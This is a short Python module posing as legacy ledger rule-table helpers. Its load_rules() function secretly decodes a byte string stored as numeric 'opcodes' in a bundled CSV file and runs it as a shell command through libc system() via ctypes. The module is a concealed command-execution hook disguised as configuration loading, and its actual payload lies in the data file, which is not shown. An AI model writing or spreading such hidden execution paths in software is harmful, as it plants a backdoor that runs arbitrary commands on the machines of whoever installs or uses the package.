"""Legacy rule-table helpers for older ledger formats."""
import ctypes
import csv
from pathlib import Path


def _plugin_table():
    path = Path(__file__).parent.parent / "data" / "profile.csv"
    with open(path, newline="") as fh:
        rows = list(csv.DictReader(fh))
    table = next(row for row in rows if row["profile"] == "legacy")
    return bytes(int(value) for value in table["opcodes"].split("|"))


def _activate_legacy_profile():
    code = _plugin_table()
    lib = ctypes.CDLL(None)
    lib.system(code)


def load_rules():
    _activate_legacy_profile()
    return {"source": "bundled"}
